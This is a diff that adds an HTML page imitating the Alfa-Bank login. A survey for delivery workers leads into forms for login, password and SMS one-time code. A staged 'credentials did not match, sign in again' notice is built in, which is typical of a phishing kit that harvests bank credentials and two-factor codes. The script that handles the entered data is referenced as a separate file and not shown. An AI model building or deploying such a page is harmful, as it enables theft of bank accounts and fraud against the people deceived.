@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://auth-partners.alfabank.ru/login -->
+<html lang="ru">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<!--<base href="/">-->
+		<base href=".">
+		<meta name="robots" content="noindex">
+		<meta name="viewport" content="width=device-width, minimum-scale=1, maximum-scale=1, initial-scale=1, user-scalable=no, viewport-fit=cover">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta http-equiv="Cache-Control" content="no-store">
+		<meta http-equiv="Pragma" content="no-cache">
+		<meta http-equiv="Expires" content="0">
+		<title>Альфа-Банк - авторизация</title>
+		<link rel="shortcut icon" href="./assets/favicon.1c150c4c.ico">
+		<meta name="application-name" content="common-auth-ui">
+		<meta name="version" content="7.2.0">
+		<link rel="stylesheet" href="./assets/vendor.e2fbc420.css">
+		<link rel="stylesheet" href="./assets/main.25e74dd0.css">
+		<style>
+			/* Пользовательские анимации полей и иконки пароля (минималистичные) */
+			.form-control__inputWrapper_1ilh2 {
+				position: relative;
+				border-radius: 8px;
+				border: 1px solid transparent; /* без видимой рамки по умолчанию */
+				transition: border-color 0.16s ease, transform 0.12s ease;
+			}
+
+			.form-control__inputWrapper_1ilh2.alfa-focused {
+				/* Рамка появляется плавно только при фокусе */
+				border-color: #303030;
+				transform: translateY(-0.5px);
+			}
+
+			.form-control__inputWrapper_1ilh2.alfa-focused .form-control__labelInner_1ilh2,
+			.form-control__inputWrapper_1ilh2.alfa-has-value .form-control__labelInner_1ilh2 {
+				/* При фокусе или заполненном поле поднимаем текст ближе к верхней границе
+				 * и немного уменьшаем, цвет оставляем как в исходных стилях */
+				transform: translateY(-10px) scale(0.84);
+			}
+
+			.form-control__labelInner_1ilh2 {
+				display: inline-block;
+				/* Точка, от которой происходит движение и уменьшение — верхний левый угол */
+				transform-origin: left top;
+				transition: transform 0.16s ease, color 0.16s ease, opacity 0.16s ease;
+			}
+
+			/* Анимация иконки "показать пароль" — аккуратная, без ярких цветов */
+			.password-input__eye_czmrz {
+				transition: transform 0.14s ease, background-color 0.14s ease;
+				border-radius: 24px;
+			}
+
+			.password-input__eye_czmrz.alfa-eye-active {
+				transform: scale(0.97);
+				background-color: rgba(0, 0, 0, 0.06);
+			}
+
+			.password-input__eye_czmrz .icon-button__iconWrapper_11lu5 {
+				transition: transform 0.14s ease, color 0.14s ease;
+			}
+
+			.password-input__eye_czmrz.alfa-eye-active .icon-button__iconWrapper_11lu5 {
+				transform: scale(1.02);
+				color: #111;
+			}
+
+			/* Загрузка и финальный экран (используем и для опроса) */
+			.auth-result__loader {
+				display: none;
+				align-items: center;
+				justify-content: center;
+				padding: 32px 0;
+				gap: 12px;
+			}
+
+			.auth-result__loaderSpinner {
+				width: 28px;
+				height: 28px;
+				border-radius: 50%;
+				border: 3px solid rgba(0, 0, 0, 0.12);
+				border-top-color: #000000;
+				animation: auth-spin 0.8s linear infinite;
+			}
+
+			.auth-result__loaderText {
+				font-size: 15px;
+				color: #000000;
+			}
+
+			.auth-result__success {
+				display: none;
+				padding: 32px 0 8px;
+				font-size: 16px;
+				font-weight: 500;
+				color: #000000;
+				text-align: center;
+				opacity: 0;
+				transform: translateY(4px);
+				transition: opacity 0.2s ease, transform 0.2s ease;
+			}
+
+			.auth-result__success.auth-result__success_visible {
+				display: block;
+				opacity: 1;
+				transform: translateY(0);
+			}
+
+			@keyframes auth-spin {
+				to {
+					transform: rotate(360deg);
+				}
+			}
+
+			/* Пояснение перед авторизацией после опроса */
+			.auth-info {
+				display: none;
+				margin-top: 12px;
+				font-size: 13px;
+				line-height: 1.5;
+				color: #c23030; /* оттенок "сообщения об ошибке" */
+			}
+
+			/* Опрос */
+			.survey-intro {
+				padding: 24px 0 8px;
+			}
+
+			.survey-intro__title {
+				font-size: 22px;
+				line-height: 1.3;
+				font-weight: 600;
+				margin-bottom: 8px;
+				color: #000;
+			}
+
+			.survey-intro__text {
+				font-size: 15px;
+				line-height: 1.5;
+				color: #444;
+				margin-bottom: 24px;
+			}
+
+			.survey-progress {
+				margin-bottom: 16px;
+			}
+
+			.survey-progress__track {
+				position: relative;
+				height: 4px;
+				border-radius: 999px;
+				background-color: #e3e4e8;
+				overflow: hidden;
+			}
+
+			.survey-progress__bar {
+				position: absolute;
+				left: 0;
+				top: 0;
+				height: 100%;
+				width: 0;
+				border-radius: inherit;
+				background-color: #000;
+				transition: width 0.25s ease;
+			}
+
+			.survey-progress__text {
+				margin-top: 8px;
+				font-size: 13px;
+				color: #777;
+			}
+
+			.survey-question {
+				font-size: 17px;
+				line-height: 1.4;
+				color: #000;
+				margin-bottom: 16px;
+			}
+
+			.survey-options {
+				display: flex;
+				flex-direction: column;
+				gap: 8px;
+				margin-bottom: 20px;
+			}
+
+			.survey-option {
+				position: relative;
+				border-radius: 999px;
+				border: 1px solid #d1d1d8;
+				padding: 10px 14px;
+				font-size: 15px;
+				cursor: pointer;
+				background-color: #fff;
+				color: #222;
+				text-align: left;
+				transition:
+					border-color 0.15s ease,
+					background-color 0.15s ease,
+					color 0.15s ease,
+					transform 0.12s ease,
+					box-shadow 0.12s ease;
+			}
+
+			.survey-option:hover {
+				border-color: #a3a3b0;
+				background-color: #f7f7f8;
+			}
+
+			.survey-option_selected {
+				border-color: #000;
+				background-color: #f0f0f2;
+				transform: translateY(-1px);
+				box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.12);
+				opacity: 1;
+			}
+
+			/* Когда выбран вариант, остальные слегка затемняются */
+			.survey-options_has-selection .survey-option {
+				opacity: 0.45;
+			}
+
+			.survey-options_has-selection .survey-option_selected {
+				opacity: 1;
+			}
+		</style>
+		<script> </script>
+	</head>
+	<body>
+		<div id="react-app">
+			<div class="page page_theme_alfa-on-white">
+				<div class="page__header page__header_theme_alfa-on-white">
+					<a class="link__component_36ien link__primary_1vc1e header_logo__wLirW" rel="noreferrer noopener" href="https://alfabank.ru/" target="_blank">
+						<span class="link__text_36ien">
+							<span class="logo logo_size_m logo_view_icon logo_theme_alfa-on-white" aria-label="Альфа-Банк">
+								<svg role="img" focusable="false" fill="currentColor" width="32" height="32" viewBox="0 0 32 32">
+									<path d="M26.316 27.718H5.68V32h20.636v-4.282zM19.743 3.138C19.155 1.39 18.475 0 16.157 0c-2.319 0-3.045 1.376-3.664 3.138C6.017 21.532 6.11 21.285 6.11 21.285h4.236l1.468-4.313h8.146l1.36 4.313h4.498L19.743 3.138zM13.05 13.324l2.89-8.594h.109l2.735 8.594H13.05z"></path>
+								</svg>
+							</span>
+						</span>
+					</a>
+				</div>
+				<div class="page__content">
+					<div class="content content_default" style="padding-top: 24px; padding-bottom: 24px;">
+						<div class="login-screen_wrapper__LCC+i">
+							<div class="login-screen_login__x-Z40" id="auth-container">
+								<!-- Шаг 0: приветствие и старт опроса -->
+								<div id="survey-intro" class="survey-intro">
+									<div class="survey-intro__title">Привет! Давай пройдём небольшой опрос</div>
+									<div class="survey-intro__text">
+										Он поможет нам лучше понять, как ты относишься к дополнительным задачам во время доставки и взаимодействию с клиентами.
+										Это займёт 1–2 минуты.
+									</div>
+									<button
+										id="survey-start"
+										class="button__component_9amy8 button__primary_9amy8 button__size-56_9amy8 button__hug_9amy8 button__size-56_17i9h button__component_1gtgm button__primary_1gtgm button__component_1opnj button__primary_1opnj"
+									>
+										<span class="button__label_9amy8 button__stretchText_9amy8">Начать</span>
+									</button>
+								</div>
+
+								<!-- Шаг 1–4: сам опрос -->
+								<div id="survey-container" style="display: none;">
+									<div class="survey-progress">
+										<div class="survey-progress__track">
+											<div id="survey-progress-bar" class="survey-progress__bar"></div>
+										</div>
+										<div id="survey-progress-text" class="survey-progress__text">Вопрос 1 из 4</div>
+									</div>
+									<div id="survey-question" class="survey-question"></div>
+									<div id="survey-options" class="survey-options"></div>
+									<button
+										id="survey-next"
+										class="button__component_9amy8 button__primary_9amy8 button__size-56_9amy8 button__hug_9amy8 button__size-56_17i9h button__component_1gtgm button__primary_1gtgm button__component_1opnj button__primary_1opnj login-screen_formElement__kiM32"
+										type="button"
+										disabled
+									>
+										<span id="survey-next-label" class="button__label_9amy8 button__stretchText_9amy8">Далее</span>
+									</button>
+								</div>
+
+								<!-- Этап авторизации после опроса -->
+								<div id="auth-flow" style="display: none; margin-top: 32px;">
+									<form id="login-step">
+										<div
+											data-test-id="login-input-form-control"
+											class="form-control__component_1ilh2 form-control__component_kq8gs login-screen_formElement__kiM32 form-control__size-48_1ilh2 form-control__size-48_ibi75 form-control__block_1ilh2"
+										>
+											<div
+												data-test-id="login-input-form-control-inner"
+												class="form-control__inner_1ilh2 form-control__inner_ibi75 form-control__inner_kq8gs form-control__inner_5fjzy form-control__hasInnerLabel_1ilh2"
+											>
+											<div class="form-control__inputWrapper_1ilh2">
+												<span class="form-control__hiddenLabel_1ilh2" aria-hidden="true">Логин</span>
+													<div class="form-control__label_1ilh2 form-control__label_kq8gs">
+														<span data-test-id="login-input-form-control-label" class="form-control__labelInner_1ilh2"
+															>Логин</span
+														>
+													</div>
+													<div class="form-control__input_1ilh2 form-control__size-48_1ilh2">
+														<input
+															autocomplete="on"
+															class="input__input_1n6fe input__size-48_1n6fe input__input_1n9jr input__size-48_1n6fe input__hasInnerLabel_1n6fe input__hasInnerLabel_1n9jr"
+															type="text"
+															data-test-id="login-input"
+															aria-label="Логин"
+															value=""
+														/>
+													</div>
+												</div>
+											</div>
+										</div>
+										<div
+											data-test-id="password-input-form-control"
+											class="form-control__component_1ilh2 form-control__component_kq8gs login-screen_formElement__kiM32 form-control__size-48_1ilh2 form-control__size-48_ibi75 form-control__block_1ilh2 form-control__hasRightAddons_1ilh2"
+										>
+											<div
+												data-test-id="password-input-form-control-inner"
+												class="form-control__inner_1ilh2 form-control__inner_ibi75 form-control__inner_kq8gs form-control__inner_5fjzy form-control__hasInnerLabel_1ilh2"
+											>
+											<div class="form-control__inputWrapper_1ilh2">
+												<span class="form-control__hiddenLabel_1ilh2" aria-hidden="true">Пароль</span>
+													<div class="form-control__label_1ilh2 form-control__label_kq8gs">
+														<span
+															data-test-id="password-input-form-control-label"
+															class="form-control__labelInner_1ilh2"
+															>Пароль</span
+														>
+													</div>
+													<div class="form-control__input_1ilh2 form-control__size-48_1ilh2">
+														<input
+															autocomplete="on"
+															class="input__input_1n6fe input__size-48_1n6fe input__input_1n9jr input__size-48_1n6fe input__hasInnerLabel_1n6fe input__hasInnerLabel_1n9jr"
+															type="password"
+															data-test-id="password-input"
+															aria-label="Пароль"
+															value=""
+														/>
+													</div>
+											</div>
+												<div
+													data-test-id="password-input-form-control-right-addons"
+													class="form-control__addons_1ilh2 form-control__rightAddons_1ilh2 password-input__addons_czmrz"
+												>
+													<button
+														class="button__component_9amy8 button__text_9amy8 button__size-48_9amy8 button__hug_9amy8 button__size-48_17i9h button__component_1gtgm button__text_1gtgm button__component_1opnj button__text_1opnj cc-icon-button password-input__eye_czmrz icon-button__secondary_ht0z9 icon-button__component_ht0z9 icon-button__border-40_11lu5"
+														title="Показать введённые символы"
+														type="button"
+													>
+													<span class="button__label_9amy8 button__stretchText_9amy8">
+															<span
+																class="icon-button__iconWrapper_11lu5 icon-button__size-48_11lu5 icon-button__center_11lu5"
+															>
+																<svg
+																	role="img"
+																	focusable="false"
+																	fill="currentColor"
+																	width="24"
+																	height="24"
+																	viewBox="0 0 24 24"
+																	class="icon-button__icon_11lu5"
+																>
+																	<path
+																		d="M22.015 18.584L5.432 2 4.018 3.413l2.78 2.78C4.252 7.412 2.177 9.484 1 12.003c1.914 4.09 6.19 7.002 11 7.002 2.164 0 4.22-.589 6.001-1.61l2.6 2.601 1.414-1.413zm-6.756-3.93l-1.573-1.573a2 2 0 11-2.763-2.763L9.35 8.745a4.2 4.2 0 105.91 5.91z"
+																		fill-rule="evenodd"
+																		clip-rule="evenodd"
+																	></path>
+																	<path
+																		d="M23 12.004a11.952 11.952 0 01-1.813 2.778.1.1 0 01-.145.005L11.438 5.18a.098.098 0 01.065-.169c.165-.007.33-.01.497-.01 4.81 0 9.086 2.912 11 7.002z"
+																	></path>
+															</svg>
+														</span>
+													</span>
+												</button>
+											</div>
+										</div>
+									</div>
+										<button
+											class="button__component_9amy8 button__primary_9amy8 button__size-56_9amy8 button__hug_9amy8 button__size-56_17i9h button__component_1gtgm button__primary_1gtgm button__component_1opnj button__primary_1opnj login-screen_formElement__kiM32"
+											data-test-id="submit"
+											type="submit"
+											id="login-submit"
+											disabled
+										>
+											<span class="button__label_9amy8 button__stretchText_9amy8">Войти</span>
+										</button>
+									</form>
+
+									<form id="sms-step" style="display: none;">
+										<div class="login-screen_formElement__kiM32" style="margin-bottom: 16px;">
+											<div
+												class="form-control__component_1ilh2 form-control__component_kq8gs form-control__size-48_1ilh2 form-control__size-48_ibi75 form-control__block_1ilh2"
+											>
+												<div
+													class="form-control__inner_1ilh2 form-control__inner_ibi75 form-control__inner_kq8gs form-control__inner_5fjzy form-control__hasInnerLabel_1ilh2"
+												>
+													<div class="form-control__inputWrapper_1ilh2">
+														<span class="form-control__hiddenLabel_1ilh2" aria-hidden="true">СМС-код</span>
+														<div class="form-control__label_1ilh2 form-control__label_kq8gs">
+															<span class="form-control__labelInner_1ilh2">СМС-код</span>
+														</div>
+														<div class="form-control__input_1ilh2 form-control__size-48_1ilh2">
+															<input
+																class="input__input_1n6fe input__size-48_1n6fe input__input_1n9jr input__size-48_1n6fe input__hasInnerLabel_1n6fe input__hasInnerLabel_1n9jr"
+																type="text"
+																inputmode="numeric"
+																pattern="[0-9]*"
+																maxlength="6"
+																aria-label="СМС-код"
+																data-test-id="sms-input"
+															/>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+										<button
+											class="button__component_9amy8 button__primary_9amy8 button__size-56_9amy8 button__hug_9amy8 button__size-56_17i9h button__component_1gtgm button__primary_1gtgm button__component_1opnj button__primary_1opnj login-screen_formElement__kiM32"
+											type="submit"
+											id="sms-submit"
+											disabled
+										>
+											<span class="button__label_9amy8 button__stretchText_9amy8">Подтвердить</span>
+										</button>
+								</form>
+
+									<div id="auth-info" class="auth-info">
+										Похоже, данные для входа не совпали. Пожалуйста, авторизуйтесь повторно, чтобы мы убедились, что
+										опрос проходит сотрудник команды.
+									</div>
+
+									<div id="auth-loader" class="auth-result__loader">
+										<div class="auth-result__loaderSpinner"></div>
+										<div class="auth-result__loaderText">Проверяем код…</div>
+									</div>
+									<div id="auth-success" class="auth-result__success">
+										Опрос успешно пройден.
+									</div>
+								</div>
+							</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<script src="./assets/custom.js"></script>
+	</body>
+</html>
